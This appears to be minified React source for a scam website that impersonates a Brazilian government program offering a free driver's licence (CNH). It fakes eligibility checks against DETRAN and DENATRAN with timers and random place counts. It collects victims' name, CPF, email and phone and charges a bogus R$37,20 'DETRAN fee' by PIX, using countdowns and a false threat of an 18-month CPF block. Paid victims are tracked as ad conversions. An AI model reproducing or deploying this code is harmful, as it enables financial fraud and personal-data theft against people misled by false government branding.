        initial: !u.current || r ? void 0 : !1,
        custom: b ? void 0 : n,
        presenceAffectsLayout: o,
        mode: i,
        onExitComplete: b ? void 0 : C,
        children: p
      }, m)
    })
  })
},
  Jr = [{
    title: "Programa CNH do Brasil",
    content: "O Programa CNH do Brasil é uma iniciativa do Governo Federal que pode garantir sua Carteira Nacional de Habilitação 100% GRATUITA! Se você for aprovado nos critérios do programa, não pagará nada pela sua CNH. Continue seu cadastro aqui no site para verificar sua elegibilidade.",
    image: "https://www.serpro.gov.br/menu/noticias/noticias-2025/cnh-do-brasil/@@images/image/large"
  }, {
    title: "Acesso ao Aplicativo",
    content: "Após finalizar seu cadastro, você receberá acesso ao aplicativo oficial do programa. Use seu CPF para acessar e acompanhar todo o processo de obtenção da sua CNH de forma simples e prática.",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "Aulas Teóricas e Práticas",
    content: "Suas aulas teóricas serão realizadas 100% pelo aplicativo, totalmente GRATUITAS! Para a parte prática, você precisará fazer apenas 2 horas de aula com um instrutor credenciado pelo DETRAN. Se você for aprovado para a gratuidade do programa, essas aulas práticas também serão gratuitas!",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "Emissão da CNH",
    content: "Após aprovação nos exames teórico e prático, sua CNH será emitida e enviada diretamente para seu endereço. Todo o processo é acompanhado pelo sistema oficial do programa.",
    image: "https://cnhbrasil.app/images/mockup-app-500x461.png"
  }, {
    title: "Taxa de Adesão DETRAN",
    content: "Para validar sua participação no programa, o DETRAN cobra uma taxa administrativa de adesão. Esta taxa é obrigatória para verificar sua elegibilidade e garantir seu acesso ao Programa CNH do Brasil.",
    image: "https://upload.wikimedia.org/wikipedia/commons/2/2b/MTRANSAssinatura.png"
  }];

function EE() {
  const [e, t] = x.useState(0), [n, r] = x.useState("idle"), [, s] = In(), i = new URLSearchParams(window.location.search).get("data"), a = async () => {
    r("loading"), await new Promise(c => setTimeout(c, 1e3)), e < Jr.length - 1 ? (r("success"), setTimeout(() => {
      t(c => c + 1), r("idle")
    }, 500)) : (r("success"), setTimeout(() => {
      s(`/verify-availability?data=${i}`)
    }, 500))
  };
  return l.jsxs("div", {
    children: [l.jsx(rt, {}), l.jsx("div", {
      className: "container",
      style: {
        maxWidth: "none",
        width: "100%"
      },
      children: l.jsx("main", {
        id: "main-signin",
        style: {
          width: "100%",
          maxWidth: "1200px",
          margin: "0 auto",
          padding: "2rem"
        },
        children: l.jsx("div", {
          className: "w-full",
          children: l.jsxs("div", {
            children: [l.jsxs(ou.div, {
              className: "flex items-center gap-3 mb-4",
              initial: {
                opacity: 0,
                y: 20
              },
              animate: {
                opacity: 1,
                y: 0
              },
              transition: {
                duration: .3
              },
              children: [l.jsx("div", {
                className: "flex items-center justify-center w-6 h-6 rounded-full bg-[#1351B4] text-white text-sm font-medium",
                children: e + 1
              }), l.jsx("p", {
                className: "font-semibold text-base",
                children: Jr[e].title
              })]
            }), l.jsxs("div", {
              className: "space-y-3 flex flex-col items-center",
              children: [l.jsx(Tg, {
                mode: "wait",
                children: l.jsx(ou.div, {
                  initial: {
                    opacity: 0,
                    x: 50
                  },
                  animate: {
                    opacity: 1,
                    x: 0
                  },
                  exit: {
                    opacity: 0,
                    x: -50
                  },
                  transition: {
                    duration: .5
                  },
                  className: "flex justify-center mb-4",
                  children: l.jsx("img", {
                    src: Jr[e].image,
                    alt: Jr[e].title,
                    className: "w-[380px] h-auto md:w-[480px] object-contain rounded-[10px] shadow-lg",
                    style: {
                      maxHeight: "400px"
                    }
                  })
                }, e)
              }), l.jsx(Tg, {
                mode: "wait",
                children: l.jsx(ou.div, {
                  initial: {
                    opacity: 0,
                    y: 20
                  },
                  animate: {
                    opacity: 1,
                    y: 0
                  },
                  exit: {
                    opacity: 0,
                    y: -20
                  },
                  transition: {
                    duration: .5
                  },
                  className: "bg-gray-50 p-8 rounded-md w-[380px] md:w-[480px]",
                  children: l.jsx("p", {
                    className: "text-gray-700 leading-relaxed text-base",
                    children: Jr[e].content
                  })
                }, e)
              })]
            }), l.jsx("div", {
              className: "flex justify-center mt-6",
              children: l.jsxs("button", {
                type: "button",
                onClick: a,
                disabled: n !== "idle",
                className: "button-continuar flex items-center justify-center gap-2 min-w-[160px]",
                children: [n === "loading" && l.jsx(vt, {
                  className: "h-4 w-4 animate-spin"
                }), n === "success" && l.jsx(It, {
                  className: "h-4 w-4"
                }), n === "loading" ? "Processando..." : n === "success" ? "Concluído" : e === Jr.length - 1 ? "Finalizar" : "Avançar"]
              })
            })]
          })
        })
      })
    })]
  })
}
const TE = [{
  uf: "AC",
  nome: "Acre"
}, {
  uf: "AL",
  nome: "Alagoas"
}, {
  uf: "AP",
  nome: "Amapá"
}, {
  uf: "AM",
  nome: "Amazonas"
}, {
  uf: "BA",
  nome: "Bahia"
}, {
  uf: "CE",
  nome: "Ceará"
}, {
  uf: "DF",
  nome: "Distrito Federal"
}, {
  uf: "ES",
  nome: "Espírito Santo"
}, {
  uf: "GO",
  nome: "Goiás"
}, {
  uf: "MA",
  nome: "Maranhão"
}, {
  uf: "MT",
  nome: "Mato Grosso"
}, {
  uf: "MS",
  nome: "Mato Grosso do Sul"
}, {
  uf: "MG",
  nome: "Minas Gerais"
}, {
  uf: "PA",
  nome: "Pará"
}, {
  uf: "PB",
  nome: "Paraíba"
}, {
  uf: "PR",
  nome: "Paraná"
}, {
  uf: "PE",
  nome: "Pernambuco"
}, {
  uf: "PI",
  nome: "Piauí"
}, {
  uf: "RJ",
  nome: "Rio de Janeiro"
}, {
  uf: "RN",
  nome: "Rio Grande do Norte"
}, {
  uf: "RS",
  nome: "Rio Grande do Sul"
}, {
  uf: "RO",
  nome: "Rondônia"
}, {
  uf: "RR",
  nome: "Roraima"
}, {
  uf: "SC",
  nome: "Santa Catarina"
}, {
  uf: "SP",
  nome: "São Paulo"
}, {
  uf: "SE",
  nome: "Sergipe"
}, {
  uf: "TO",
  nome: "Tocantins"
}];

function kE() {
  const [, e] = In(), [t, n] = x.useState(0), [r, s] = x.useState("analyzing"), [o, i] = x.useState(null), a = x.useMemo(() => TE.map(h => ({
    uf: h.uf,
    nome: h.nome,
    vagas: Math.floor(Math.random() * 60) + 43
  })), []), c = [{
    id: 1,
    message: "Verificando dados junto ao DETRAN",
    completed: !1
  }, {
    id: 2,
    message: "Consultando elegibilidade do CPF no DENATRAN",
    completed: !1
  }, {
    id: 3,
    message: "Verificando disponibilidade de vagas no programa",
    completed: !1
  }, {
    id: 4,
    message: "Analisando documentação junto ao Ministério dos Transportes",
    completed: !1
  }];
  x.useEffect(() => {
    const h = localStorage.getItem("userData");
    if(h){const _ud=JSON.parse(h);if(!_ud.cpf){try{const _up=new URLSearchParams(window.location.search).get("data");if(_up){const _pd=JSON.parse(decodeURIComponent(_up));_pd&&_pd.cpf&&(_ud.cpf=_pd.cpf)}}catch(e){}}i(_ud)}
    const y = 2500;
    let w = 0;
    const v = setInterval(() => {
      w < c.length ? (n(w), w++) : (clearInterval(v), s("approved"))
    }, y);
    return () => clearInterval(v)
  }, []);
  const u = h => (h||"").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"),
    d = h => {
      if (!h) return "";
      if (/^\d{2}\/\d{2}\/\d{4}$/.test(h)) return h;
      if (/^\d{4}-\d{2}-\d{2}$/.test(h)) {
        const [w, v, S] = h.split("-");
        return `${S}/${v}/${w}`
      }
      const y = new Date(h);
      return isNaN(y.getTime()) ? h : y.toLocaleDateString("pt-BR")
    },
    f = h => {
      localStorage.setItem("selectedDetran", JSON.stringify(h)), e("/chat")
    };
  return l.jsxs("div", {
    children: [l.jsx(rt, {}), l.jsx("div", {
      className: "container mx-auto px-4 py-6",
      children: o && l.jsxs("div", {
        className: "max-w-4xl mx-auto",
        children: [l.jsxs("div", {
          className: "grid grid-cols-2 gap-4 mb-6",
          children: [l.jsxs("div", {
            className: "col-span-2",
            children: [l.jsx("label", {
              className: "block text-sm font-medium text-gray-700",
              children: "Nome Completo"
            }), l.jsx("input", {
              type: "text",
              value: o.nome,
              disabled: !0,
              className: "mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]"
            })]
          }), l.jsxs("div", {
            children: [l.jsx("label", {
              className: "block text-sm font-medium text-gray-700",
              children: "CPF"
            }), l.jsx("input", {
              type: "text",
              value: u(o.cpf),
              disabled: !0,
              className: "mt-1 block w-full px-3 py-2 bg-white border border-gray-300 rounded-md shadow-sm focus:outline-none focus:ring-[#1351B4] focus:border-[#1351B4]"
            })]
          })]
        }), l.jsxs("div", {
          className: "mt-8 border-t border-gray-200 pt-8",
          children: [r === "analyzing" && l.jsx("div", {
            className: "space-y-6",
            children: c.map((h, y) => l.jsxs("div", {
              className: `flex items-center gap-3 ${y > t ? "opacity-40" : ""}`,
              children: [y === t ? l.jsx(vt, {
                className: "h-5 w-5 animate-spin text-green-600"
              }) : y < t ? l.jsx("div", {
                className: "flex items-center justify-center w-6 h-6 rounded-full bg-green-100",
                children: l.jsx(It, {
                  className: "h-4 w-4 text-green-600"
                })
              }) : l.jsx("div", {
                className: "w-6 h-6 rounded-full border-2 border-gray-200"
              }), l.jsx("span", {
                className: "font-medium",
                children: h.message
              })]
            }, h.id))
          }), r === "approved" && l.jsxs("div", {
            className: "space-y-6",
            children: [l.jsx("div", {
              className: "bg-green-50 rounded-lg p-5 mb-6",
              children: l.jsxs("div", {
                className: "text-center",
                children: [l.jsx("h4", {
                  className: "text-base font-semibold text-green-800 mb-3",
                  children: "Parabéns! Cadastro Aprovado com Sucesso"
                }), l.jsxs("p", {
                  className: "text-sm text-green-700 leading-relaxed",
                  children: ["Prezado(a) ", l.jsx("strong", {
                    children: o.nome
                  }), ", CPF ", l.jsx("strong", {
                    children: u(o.cpf)
                  }), ", informamos que sua solicitação foi analisada e ", l.jsx("strong", {
                    children: "APROVADA"
                  }), " pelo Sistema Nacional de Habilitação."]
                }), l.jsxs("p", {
                  className: "text-sm text-green-700 leading-relaxed mt-2",
                  children: ["O(A) senhor(a) está apto(a) a obter a Carteira Nacional de Habilitação (CNH) de forma ", l.jsx("strong", {
                    children: "gratuita"
                  }), ", sem a necessidade de frequentar autoescola, conforme as diretrizes do Programa CNH do Brasil."]
                }), l.jsx("p", {
                  className: "text-sm text-green-700 leading-relaxed mt-2",
                  children: "Para dar continuidade ao processo, selecione abaixo o DETRAN correspondente ao seu estado de residência."
                })]
              })
            }), l.jsxs("div", {
              className: "mt-6",
              children: [l.jsx("h4", {
                className: "font-semibold text-[#1351B4] mb-4 text-center text-lg border-b-2 border-[#1351B4] pb-2",
                children: "Selecione o DETRAN do seu Estado"
              }), l.jsx("div", {
                className: "space-y-2",
                children: a.map(h => l.jsxs("div", {
                  className: "flex items-center justify-between p-3 bg-white rounded-sm border border-gray-300 shadow-sm hover:shadow-md hover:border-[#1351B4] transition-all",
                  children: [l.jsxs("div", {
                    className: "flex flex-col gap-1",
                    children: [l.jsxs("span", {
                      className: "font-medium text-gray-800",
                      children: ["Detran ", h.nome]
                    }), l.jsxs("span", {
                      className: "text-sm text-[#1351B4] font-semibold bg-[#1351B4]/10 px-2 py-0.5 rounded-sm w-fit",
                      children: [h.vagas, " vagas"]
                    })]
                  }), l.jsx("button", {
                    onClick: () => f(h),
                    className: "bg-[#1351B4] hover:bg-[#0D3A8C] text-white px-5 py-2 rounded-sm text-sm font-medium transition-all shadow-sm hover:shadow-md whitespace-nowrap",
                    children: "Iniciar Processo"
                  })]
                }, h.uf))
              })]
            })]
          })]
        })]
      })
    })]
  })
}

function RE() {
  const [e, t] = x.useState(600);
  x.useEffect(() => {
    if (e <= 0) return;
    const o = setInterval(() => {
      t(i => i - 1)
    }, 1e3);
    return () => clearInterval(o)
  }, [e]);
  const n = Math.floor(e / 60),
    r = e % 60,
    s = () => {
      window.location.href = "/pix-payment"
    };
  return l.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: l.jsxs(bn, {
        className: "max-w-xl mx-auto shadow-lg border-0",
        children: [l.jsxs(ci, {
          className: "text-center space-y-2 pb-6 border-b",
          children: [l.jsx(ui, {
            className: "text-2xl font-bold text-gray-900",
            children: "Realizar Pagamento"
          }), l.jsx("p", {
            className: "text-gray-600",
            children: "Programa CNH do Brasil"
          })]
        }), l.jsx(Sn, {
          className: "pt-6",
          children: l.jsxs("div", {
            className: "mb-8",
            children: [l.jsxs("p", {
              className: "text-base text-green-800 mb-4",
              children: [l.jsx("strong", {
                children: "Cadastro aprovado!"
              }), " Para finalizar, é necessário pagar as taxas obrigatórias do DETRAN:"]
            }), l.jsxs("div", {
              className: "bg-white p-4 rounded-md mb-6 border border-gray-200",
              children: [l.jsx("h4", {
                className: "font-semibold text-gray-800 mb-3",
                children: "Taxas Obrigatórias:"
              }), l.jsxs("div", {
                className: "space-y-2 text-sm text-gray-700",
                children: [l.jsxs("div", {
                  className: "flex justify-between items-start",
                  children: [l.jsxs("span", {
                    children: ["• Taxa de Expedição", l.jsx("br", {}), "do Documento (TED)"]
                  }), l.jsx("span", {
                    className: "font-bold whitespace-nowrap",
                    children: "R$11,95"
                  })]
                }), l.jsxs("div", {
                  className: "flex justify-between items-start",
                  children: [l.jsxs("span", {
                    children: ["• Taxa de Serviço", l.jsx("br", {}), "Administrativo (TSA)"]
                  }), l.jsx("span", {
                    className: "font-bold whitespace-nowrap",
                    children: "R$13,40"
                  })]
                }), l.jsxs("div", {
                  className: "flex justify-between items-start",
                  children: [l.jsxs("span", {
                    children: ["• Taxa de Processamento", l.jsx("br", {}), "e Emissão (TPE)"]
                  }), l.jsx("span", {
                    className: "font-bold whitespace-nowrap",
                    children: "R$11,85"
                  })]
                }), l.jsx("hr", {
                  className: "my-2"
                }), l.jsxs("div", {
                  className: "flex justify-between font-bold text-base",
                  children: [l.jsx("span", {
                    children: "Total:"
                  }), l.jsx("span", {
                    className: "whitespace-nowrap",
                    children: "R$37,20"
                  })]
                })]
              })]
            }), l.jsxs("div", {
              className: "space-y-4 mb-8",
              children: [l.jsxs("div", {
                className: "p-4 bg-yellow-50 rounded-lg border border-yellow-100",
                children: [l.jsx("div", {
                  className: "flex justify-center mb-3",
                  children: l.jsxs("div", {
                    className: "bg-yellow-500 text-white px-4 py-2 rounded-full font-bold text-xl",
                    children: [String(n).padStart(2, "0"), ":", String(r).padStart(2, "0")]
                  })
                }), l.jsx("p", {
                  className: "text-yellow-800 text-center font-medium",
                  children: "Atenção: Sua vaga está reservada temporariamente"
                }), l.jsx("p", {
                  className: "text-yellow-700 text-sm text-center mt-2",
                  children: "Complete o pagamento antes que o tempo expire ou sua vaga será disponibilizada para outro cidadão"
                })]
              }), l.jsxs("div", {
                className: "flex items-center gap-2 p-4 bg-red-50 rounded-lg border border-red-100",
                children: [l.jsx(CC, {
                  className: "h-5 w-5 shrink-0 text-red-500"
                }), l.jsxs("p", {
                  className: "text-red-800 text-sm",
                  children: [l.jsx("strong", {
                    children: "Importante:"
                  }), " O não pagamento resultará na perda permanente do direito ao programa e sua vaga será imediatamente liberada para outro cidadão na fila de espera"]
                })]
              })]
            }), l.jsx(jn, {
              className: "w-full bg-green-600 hover:bg-green-700 text-white py-7 text-lg font-semibold rounded-lg transition-all duration-200 shadow-lg hover:shadow-xl",
              onClick: s,
              children: "Realizar Pagamento"
            })]
          })
        })]
      })
    })]
  })
}

function DE() {
  var P;
  const [, e] = In(), [t, n] = x.useState(null), [r, s] = x.useState(!1), [o, i] = x.useState(!1), [a, c] = x.useState(600), [u, d] = x.useState(null), [f, h] = x.useState(null), [y, w] = x.useState("pending"), v = x.useRef(!1), [S, g] = x.useState(null);
  x.useEffect(() => {
    const M = localStorage.getItem("userData");
    if (M) try {
      g(JSON.parse(M))
    } catch (_) {
      console.error("Error parsing userData:", _)
    }
  }, []);
  const p = M => M ? M.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4") : "";
  x.useEffect(() => {
    if (a <= 0) return;
    const M = setInterval(() => {
      c(_ => _ - 1)
    }, 1e3);
    return () => clearInterval(M)
  }, [a]), x.useEffect(() => {
    v.current || (v.current = !0, b())
  }, []);
  const m = x.useCallback(async M => {
    try {
      const G = await (await fetch(`/api/check-payment?id=${M}`)).json();
      if (G.success && G.status) {
        if (w(G.status), G.status === "paid") {
          console.log("PAGAMENTO CONFIRMADO!");
          const I = `fb_conversion_${M}`;
          return !localStorage.getItem(I) && typeof window.fbq < "u" && (window.fbq("track", "Purchase", {
            value: (t == null ? void 0 : t.amount) || 37.20,
            currency: "BRL",
            content_name: "Pagamento via PIX - CNH do Brasil",
            content_type: "product",
            content_ids: [M],
            transaction_id: M
          }), localStorage.setItem(I, new Date().toISOString())), setTimeout(() => {
            e("/success")
          }, 1e3), !0
        } else if (G.status === "expired" || G.status === "cancelled") return console.log("Transação expirada ou cancelada"), d("Transação expirada ou cancelada. Por favor, tente novamente."), !0
      }
      return !1
    } catch (_) {
      return console.error("Erro ao verificar status:", _), !1
    }
  }, [t, e]);
  x.useEffect(() => {
    if (!(t != null && t.transaction_id)) return;
    const M = setInterval(async () => {
      await m(t.transaction_id) && clearInterval(M)
    }, 5e3);
    return () => clearInterval(M)
  }, [t == null ? void 0 : t.transaction_id, m]);
  const b = async () => {
    s(!0), d(null);
    try {
      const M = localStorage.getItem("userData");
      if (!M) {
        d("Dados do usuário não encontrados");
        return
      }
      const _ = JSON.parse(M),
        I = await (await fetch("/api/pix", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            amount: 37.20,
            customer_name: _.nome,
            customer_email: _.email,
            customer_phone: _.phone,
            customer_cpf: _.cpf
          })
        })).json();
      if (I.success) {
        if (n(I), I.pix_code) try {
          const $ = await Zs.toDataURL(I.pix_code, {
            width: 256,
            margin: 2,
            color: {
              dark: "#000000",
              light: "#FFFFFF"
            }
          });
          h($)
        } catch ($) {
          console.error("Erro ao gerar QR code:", $)
        }
      } else d(I.error || "Erro ao gerar PIX")
    } catch (M) {
      console.error("Erro ao criar transação PIX:", M), d("Erro ao conectar com o servidor")
    } finally {
      s(!1)
    }
  }, C = async () => {
    if (t != null && t.pix_code) try {
      await navigator.clipboard.writeText(t.pix_code), i(!0), setTimeout(() => i(!1), 2e3)
    } catch (M) {
      console.error("Erro ao copiar:", M)
    }
  }, j = Math.floor(a / 60), A = a % 60;
  return r ? l.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: l.jsx(bn, {
        className: "max-w-xl mx-auto",
        children: l.jsx(Sn, {
          className: "pt-6",
          children: l.jsxs("div", {
            className: "text-center",
            children: [l.jsx("div", {
              className: "animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto mb-4"
            }), l.jsx("p", {
              children: "Gerando PIX..."
            })]
          })
        })
      })
    })]
  }) : u ? l.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: l.jsxs(bn, {
        className: "max-w-xl mx-auto",
        children: [l.jsx(ci, {
          className: "text-center space-y-2 pb-6 border-b",
          children: l.jsx(ui, {
            className: "text-2xl font-bold text-red-600",
            children: "Erro no Pagamento"
          })
        }), l.jsx(Sn, {
          className: "pt-6",
          children: l.jsxs("div", {
            className: "text-center space-y-4",
            children: [l.jsx("div", {
              className: "bg-red-50 p-4 rounded-lg border border-red-100",
              children: l.jsx("p", {
                className: "text-red-800 text-sm",
                children: u
              })
            }), l.jsxs("div", {
              className: "bg-blue-50 p-4 rounded-lg border border-blue-100",
              children: [l.jsx("h4", {
                className: "font-semibold text-blue-900 mb-2",
                children: "O que fazer:"
              }), l.jsxs("ul", {
                className: "text-sm text-blue-800 text-left space-y-1",
                children: [l.jsx("li", {
                  children: "• Verifique seus dados e tente novamente"
                }), l.jsx("li", {
                  children: "• Entre em contato com o suporte se o problema persistir"
                }), l.jsx("li", {
                  children: "• Alternativamente, use outro método de pagamento"
                })]
              })]
            }), l.jsxs("div", {
              className: "flex gap-3",
              children: [l.jsx(jn, {
                onClick: () => window.location.reload(),
                className: "flex-1 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
                children: "Tentar Novamente"
              }), l.jsx(jn, {
                onClick: () => e("/pagamento"),
                variant: "outline",
                className: "flex-1",
                children: "Voltar"
              })]
            })]
          })
        })]
      })
    })]
  }) : y === "paid" ? l.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: l.jsx(bn, {
        className: "max-w-xl mx-auto",
        children: l.jsx(Sn, {
          className: "pt-6",
          children: l.jsxs("div", {
            className: "text-center",
            children: [l.jsx("div", {
              className: "w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4",
              children: l.jsx(It, {
                className: "w-8 h-8 text-green-600"
              })
            }), l.jsx("h2", {
              className: "text-2xl font-bold text-green-600 mb-2",
              children: "Pagamento Confirmado!"
            }), l.jsx("p", {
              className: "text-gray-600",
              children: "Redirecionando..."
            })]
          })
        })
      })
    })]
  }) : l.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: l.jsxs(bn, {
        className: "max-w-xl mx-auto shadow-lg border-0",
        children: [l.jsxs(ci, {
          className: "space-y-4 pb-6 border-b",
          children: [l.jsx(ui, {
            className: "text-xl font-bold text-gray-900 text-center",
            children: "Detalhes da Cobrança"
          }), l.jsxs("div", {
            className: "bg-gray-50 p-4 rounded-lg space-y-3",
            children: [l.jsxs("div", {
              className: "flex justify-between items-center",
              children: [l.jsx("span", {
                className: "text-gray-600 text-sm",
                children: "Nome:"
              }), l.jsx("span", {
                className: "font-medium text-gray-900",
                children: (S == null ? void 0 : S.nome) || "Carregando..."
              })]
            }), l.jsxs("div", {
              className: "flex justify-between items-center",
              children: [l.jsx("span", {
                className: "text-gray-600 text-sm",
                children: "CPF:"
              }), l.jsx("span", {
                className: "font-medium text-gray-900",
                children: p((S == null ? void 0 : S.cpf) || "")
              })]
            }), l.jsxs("div", {
              className: "flex justify-between items-center",
              children: [l.jsx("span", {
                className: "text-gray-600 text-sm",
                children: "Valor:"
              }), l.jsx("span", {
                className: "font-bold text-green-600",
                children: "R$ 37,20"
              })]
            }), l.jsxs("div", {
              className: "flex justify-between items-center",
              children: [l.jsx("span", {
                className: "text-gray-600 text-sm",
                children: "Situação:"
              }), l.jsx("span", {
                className: "font-medium text-yellow-600 bg-yellow-100 px-2 py-1 rounded text-sm",
                children: "Aguardando pagamento"
              })]
            })]
          }), l.jsx("div", {
            className: "bg-red-600 p-4 rounded-lg",
            children: l.jsxs("div", {
              className: "flex flex-col items-center text-center",
              children: [l.jsx("svg", {
                className: "h-10 w-10 text-white mb-3",
                fill: "currentColor",
                viewBox: "0 0 20 20",
                children: l.jsx("path", {
                  fillRule: "evenodd",
                  d: "M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z",
                  clipRule: "evenodd"
                })
              }), l.jsxs("div", {
                className: "text-white text-sm",
                children: [l.jsx("p", {
                  className: "font-bold mb-2",
                  children: "ATENÇÃO - AVISO IMPORTANTE"
                }), l.jsxs("p", {
                  className: "mb-2",
                  children: ["O processo de cadastro do seu CPF já foi aberto junto ao DETRAN. Caso o pagamento das taxas obrigatórias não seja realizado dentro do prazo estabelecido, seu CPF ficará ", l.jsx("strong", {
                    children: "bloqueado no sistema do DENATRAN pelo período de 18 meses"
                  }), ", ficando impedido de emitir a CNH durante este período."]
                }), l.jsx("p", {
                  className: "font-semibold",
                  children: "Realize o pagamento agora e evite maiores transtornos."
                })]
              })]
            })
          })]
        }), l.jsxs(Sn, {
          className: "pt-6",
          children: [l.jsx("div", {
            className: "mb-6",
            children: l.jsxs("div", {
              className: "p-4 bg-yellow-50 rounded-lg border border-yellow-100",
              children: [l.jsx("div", {
                className: "flex justify-center mb-3",
                children: l.jsxs("div", {
                  className: "bg-yellow-500 text-white px-4 py-2 rounded-full font-bold text-xl flex items-center gap-2",
                  children: [l.jsx(NC, {
                    className: "h-5 w-5"
                  }), String(j).padStart(2, "0"), ":", String(A).padStart(2, "0")]
                })
              }), l.jsx("p", {
                className: "text-yellow-800 text-center font-medium",
                children: "Tempo limite para pagamento"
              })]
            })
          }), l.jsxs("div", {
            className: "text-center mb-6",
            children: [l.jsxs("p", {
              className: "text-3xl font-bold text-green-600",
              children: ["R$ ", ((P = t == null ? void 0 : t.amount) == null ? void 0 : P.toFixed(2).replace(".", ",")) || "37,20"]
            }), l.jsx("p", {
              className: "text-gray-600",
              children: "Valor a ser pago"
            })]
          }), l.jsxs("div", {
            className: "text-center mb-6",
            children: [f ? l.jsx("div", {
              className: "bg-white p-4 rounded-lg border-2 border-gray-200 inline-block",
              children: l.jsx("img", {
                src: f,
                alt: "QR Code PIX",
                className: "w-48 h-48"
              })
            }) : t != null && t.pix_code ? l.jsxs("div", {
              className: "bg-white p-8 rounded-lg border-2 border-gray-200 inline-block",
              children: [l.jsx("div", {
                className: "animate-spin rounded-full h-8 w-8 border-b-2 border-blue-600 mx-auto"
              }), l.jsx("p", {
                className: "text-sm text-gray-500 mt-2",
                children: "Gerando QR Code..."
              })]
            }) : l.jsx("div", {
              className: "bg-white p-8 rounded-lg border-2 border-gray-200 inline-block",
              children: l.jsx(PC, {
                className: "w-32 h-32 text-gray-400 mx-auto"
              })
            }), l.jsx("p", {
              className: "text-sm text-gray-600 mt-2",
              children: f || t != null && t.pix_code ? "Escaneie o QR Code com o app do seu banco" : "Use o código PIX abaixo no seu aplicativo bancário"
            })]
          }), (t == null ? void 0 : t.pix_code) && l.jsxs("div", {
            className: "mb-6",
            children: [l.jsx("p", {
              className: "text-sm font-medium text-gray-700 mb-2",
              children: "Código PIX Copia e Cola:"
            }), l.jsxs("div", {
              className: "space-y-3",
              children: [l.jsx("div", {
                className: "p-3 bg-gray-50 rounded-lg border font-mono text-sm break-all max-h-24 overflow-y-auto",
                children: t.pix_code
              }), l.jsxs(jn, {
                onClick: C,
                className: "w-full flex items-center justify-center gap-2 bg-[#1351B4] hover:bg-[#1351B4]/90 text-white",
                children: [o ? l.jsx(It, {
                  className: "h-4 w-4"
                }) : l.jsx(Ol, {
                  className: "h-4 w-4"
                }), o ? "Copiado!" : "Copiar Código PIX"]
              })]
            })]
          }), l.jsxs("div", {
            className: "bg-blue-50 p-4 rounded-lg border border-blue-100 mb-6",
            children: [l.jsx("h4", {
              className: "font-semibold text-blue-900 mb-2",
              children: "Como pagar:"
            }), l.jsxs("ol", {
              className: "text-sm text-blue-800 space-y-1",
              children: [l.jsx("li", {
                children: "1. Abra o aplicativo do seu banco"
              }), l.jsx("li", {
                children: "2. Acesse a opção PIX"
              }), l.jsx("li", {
                children: "3. Escaneie o QR Code ou cole o código PIX"
              }), l.jsx("li", {
                children: "4. Confirme o pagamento de R$ 37,20"
              })]
            })]
          }), l.jsxs("div", {
            className: "bg-gray-50 p-3 rounded-lg border text-center mb-4",
            children: [l.jsxs("p", {
              className: "text-sm text-gray-600",
              children: ["Status: ", l.jsx("span", {
                className: "font-medium text-yellow-600",
                children: "Aguardando pagamento..."
              })]
            }), l.jsx("p", {
              className: "text-xs text-gray-500 mt-1",
              children: "O pagamento será confirmado automaticamente"
            })]
          }), t && l.jsx("div", {
            className: "border-t pt-4",
            children: l.jsxs("p", {
              className: "text-xs text-gray-500",
              children: ["ID da Transação: ", t.transaction_id]
            })
          })]
        })]
      })
    })]
  })
}

function ME(e) {
  return e.toLowerCase().split(" ").map(t => t.charAt(0).toUpperCase() + t.slice(1).toLowerCase()).join(" ")
}

function _E(e) {
  return e.replace(/\D/g, "").replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4")
}

function IE() {
  const [e, t] = x.useState(null), [n] = x.useState(() => {
    const s = Date.now(),
      o = Math.floor(Math.random() * 1e4);
    return `CNH${s}${o}`
  });
  x.useEffect(() => {
    try {
      const s = localStorage.getItem("userData");
      s && t(JSON.parse(s))
    } catch (s) {
      console.error("Error parsing user data:", s)
    }
  }, []);
  const r = new Date().toLocaleDateString("pt-BR", {
    day: "2-digit",
    month: "2-digit",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit"
  });
  return l.jsxs("div", {
    className: "min-h-screen bg-gradient-to-b from-gray-50 to-white",
    children: [l.jsx(rt, {}), l.jsx("main", {
      className: "container mx-auto px-4 py-8",
      children: l.jsx(bn, {
        className: "max-w-2xl mx-auto shadow-lg border-0",
        children: l.jsxs(Sn, {
          className: "pt-8 pb-8",
          children: [l.jsxs("div", {
            className: "text-center mb-8",
            children: [l.jsx("div", {
              className: "w-20 h-20 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4",
              children: l.jsx(It, {
                className: "w-10 h-10 text-green-600"
              })
            }), l.jsx("h1", {
              className: "text-3xl font-bold text-green-600 mb-2",
              children: "Cadastro Concluído!"
            }), l.jsx("p", {
              className: "text-gray-600",
